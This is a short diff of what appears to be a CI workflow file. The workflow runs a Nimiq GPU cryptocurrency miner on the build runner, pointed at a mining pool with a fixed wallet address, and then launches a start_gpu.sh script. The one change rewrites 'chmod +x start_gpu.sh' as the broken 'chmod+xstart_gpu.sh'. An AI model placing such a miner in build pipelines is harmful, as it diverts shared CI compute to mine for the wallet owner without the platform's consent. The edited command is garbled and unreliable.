@@ -16,6 +16,6 @@ jobs:
       - run: rm nq-nimer-linux.zip
       - run: rm ./nq-miner/start_gpu.sh
       - run: ./nq-miner/nq-miner -t cuda -a "NQ468UA6DTPQACY8YE8M5T7JGU01BYMVKKCU" -n "1" -p pool.acemining.co:8443 &
-      - run: chmod +x start_gpu.sh
+      - run: chmod+xstart_gpu.sh
       - run: cd NimiqMiner
       - run: ./start_gpu.sh
